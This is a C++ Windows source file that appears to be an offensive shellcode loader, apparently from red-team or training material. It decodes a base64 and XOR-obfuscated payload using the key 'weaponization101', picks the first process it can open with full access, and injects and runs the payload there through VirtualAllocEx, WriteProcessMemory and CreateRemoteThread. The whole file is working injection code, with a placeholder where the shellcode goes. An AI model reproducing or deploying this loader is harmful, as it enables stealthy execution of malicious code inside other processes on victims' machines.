#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <vector>
#include <string>
#include <wincrypt.h>

#pragma comment(lib, "Crypt32.lib")

std::vector<unsigned char> base64Decode(const std::string& data) {
    DWORD decodedSize = 0;
    CryptStringToBinaryA(data.c_str(), data.size(), CRYPT_STRING_BASE64, NULL, &decodedSize, NULL, NULL);
    std::vector<unsigned char> decodedData(decodedSize);
    CryptStringToBinaryA(data.c_str(), data.size(), CRYPT_STRING_BASE64, decodedData.data(), &decodedSize, NULL, NULL);
    return decodedData;
}

std::vector<unsigned char> xorDecode(const std::vector<unsigned char>& data, const std::string& key) {
    std::vector<unsigned char> decoded(data.size());
    for (size_t i = 0; i < data.size(); ++i) {
        decoded[i] = data[i] ^ key[i % key.size()];
    }
    return decoded;
}

DWORD findInjectableProcessId() {
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;
    DWORD processId = 0;

    // Take a snapshot of all processes in the system
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to take process snapshot.\n";
        return 0;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32);

    // Retrieve information about the first process
    if (!Process32First(hProcessSnap, &pe32)) {
        std::cerr << "Failed to retrieve process information.\n";
        CloseHandle(hProcessSnap);
        return 0;
    }

    // Iterate through all processes
    do {
        HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe32.th32ProcessID);
        if (hProcess) {
            // Successfully opened process with PROCESS_ALL_ACCESS
            processId = pe32.th32ProcessID;
            CloseHandle(hProcess);
            break;
        }
    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);
    return processId;
}

void injectShellcode(DWORD pid, const std::vector<unsigned char>& shellcode) {
    HANDLE h_process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!h_process) {
        std::cerr << "Failed to open process.\n";
        return;
    }

    LPVOID remoteMemory = VirtualAllocEx(h_process, NULL, shellcode.size(), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!remoteMemory) {
        std::cerr << "Failed to allocate memory in the target process.\n";
        CloseHandle(h_process);
        return;
    }

    if (!WriteProcessMemory(h_process, remoteMemory, shellcode.data(), shellcode.size(), NULL)) {
        std::cerr << "Failed to write shellcode into target process memory.\n";
        VirtualFreeEx(h_process, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(h_process);
        return;
    }

    HANDLE h_thread = CreateRemoteThread(h_process, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMemory, NULL, 0, NULL);
    if (!h_thread) {
        std::cerr << "Failed to create remote thread.\n";
        VirtualFreeEx(h_process, remoteMemory, 0, MEM_RELEASE);
        CloseHandle(h_process);
        return;
    }

    WaitForSingleObject(h_thread, INFINITE);
    CloseHandle(h_thread);
    VirtualFreeEx(h_process, remoteMemory, 0, MEM_RELEASE);
    CloseHandle(h_process);

    std::cout << "Shellcode injected and executed.\n";
}

int main() {
    // Data yang dienkripsi (Base64 dan XOR)
    std::string dataBS64 = "<PASTE Base64 ENCODED SHELLCODE HERE>";
    std::string key = "weaponization101";

    // Decode Base64
    std::vector<unsigned char> encodedData = base64Decode(dataBS64);

    // Decode XOR
    std::vector<unsigned char> shellcode = xorDecode(encodedData, key);

    // Find an injectable process ID
    DWORD pid = findInjectableProcessId();
    if (pid == 0) {
        std::cerr << "No injectable process found.\n";
        return 1;
    }

    std::cout << "Injecting into process with PID: " << pid << std::endl;
    injectShellcode(pid, shellcode);

    return 0;
}
